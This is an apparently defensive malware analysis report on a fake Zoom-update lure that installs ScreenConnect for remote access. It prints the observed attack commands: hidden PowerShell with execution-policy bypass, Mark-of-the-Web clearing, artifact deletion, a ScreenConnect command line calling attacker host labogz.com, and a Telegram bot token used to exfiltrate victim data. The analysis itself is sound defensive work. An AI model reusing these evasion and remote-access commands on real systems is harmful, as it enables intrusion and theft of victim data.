# Full Technical Report

## Scope

This document expands the findings summarized in the repository README and preserves the evidence-oriented reasoning behind each analytical conclusion.

## Evidence-Based Findings

### Finding 1: The lure is Zoom-themed and designed around user confusion

The campaign notes indicate that the fake page attempts to convince the user there is a problem with Zoom software and that the user should download a new or updated version before returning to the conversation.

This supports a social-engineering-driven initial access model rather than exploit delivery.

### Finding 2: A VBS stage was executed

Observed command:
```cmd
"C:\Windows\System32\wscript.exe" "C:\Users\admin\AppData\Local\Temp\ZoomInstaller_Final.vbs"
```

Additional script-related telemetry:
- `IXMLDOMElement -> dataType((SET)String) = "bin.base64"`
- `IWshShell3 -> ExpandEnvironmentStrings("%TEMP%")`

This combination strongly indicates a VBS-based staging script using environment expansion and Base64 reconstruction behavior.

### Finding 3: A PowerShell stage was executed covertly

Observed command:
```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Users\admin\AppData\Local\Temp\ZoomInstaller_Final.ps1"
```

This is a high-confidence sign of script-driven follow-on execution with user visibility intentionally minimized.

### Finding 4: Mark-of-the-Web evidence was cleared

Observed commands:
```cmd
"C:\Windows\System32\cmd.exe" /c echo. > "C:\Users\admin\Downloads\DesktopInstaller.vbs:Zone.Identifier" 2>nul
"C:\Windows\System32\cmd.exe" /c echo. > "C:\Users\admin\AppData\Local\Temp\installer_55569.msi:Zone.Identifier" 2>nul
```

These operations indicate direct tampering with Zone.Identifier alternate data streams.

### Finding 5: Temporary installer cleanup was delayed to reduce artifacts

Observed command:
```cmd
"C:\Windows\System32\cmd.exe" /c ping -n 15 127.0.0.1 >nul & del /f /q "C:\Users\admin\AppData\Local\Temp\installer_55569.msi" 2>nul
```

The `ping` delay followed by silent forced deletion is a common artifact-reduction pattern.

### Finding 6: ScreenConnect was installed as a persistence mechanism

Observed executable path:
```cmd
C:\Program Files (x86)\ScreenConnect Client (d33f78b4994b28a6)\ScreenConnect.ClientService.exe
```

Observed registry path:
```reg
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\ScreenConnect Client (d33f78b4994b28a6)
```

The combination of a dedicated client service executable and a service registry path establishes that the payload achieved service-based persistence.

### Finding 7: The ScreenConnect client was configured to reach attacker-controlled infrastructure

Observed command line:
```cmd
"C:\Program Files (x86)\ScreenConnect Client (d33f78b4994b28a6)\ScreenConnect.ClientService.exe" "?e=Access&y=Guest&h=labogz.com&p=8041&s=a922f424-3ea9-41da-8b4a-1dfd978702f8&k=..."
```

This provides direct evidence of:
- Hostname: `labogz.com`
- Port: `8041`
- Provisioned access/session context

### Finding 8: Telegram was used for interaction telemetry

Observed API usage:
```text
/bot8306714610:AAEH6GIcZcdlCoXhGj48AhMaYqeQRaMNtCQ/sendMessage
```

Observed data sample includes:
- Victim name
- Victim IP
- Device/User-Agent string

This supports the conclusion that the actor monitored interaction events in near real time.

### Finding 9: COM registration occurred during the chain

Observed registry modification:
```reg
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6FF59A85-BC37-4CD4-E747-4A924E84C083}\InprocServer32
ThreadingModel = Apartment
```

This indicates in-process COM registration. At present, this should be treated as suspicious supporting evidence and not as a stand-alone proof of COM hijacking unless the registered DLL is recovered and validated.

## Analytical Constraints

- The report is based on extracted ANY.RUN notes and telemetry fields rather than a full reverse engineering trace of every script line.
- Some blobs passed to ScreenConnect parameters appear encoded or serialized. Their functional role is clear enough to support the remote access conclusion even where byte-level decoding was not performed.
- Infrastructure intent is inferred from execution context and command-line evidence.

## Recommended Next Steps

1. Recover the dropped VBS and PS1 files for static analysis
2. Export the ScreenConnect service configuration and related files from disk
3. Recover the COM DLL path from `InprocServer32`
4. Correlate host telemetry with network logs for `labogz.com:8041`
5. Search enterprise telemetry for Telegram Bot API connections during user-driven download workflows
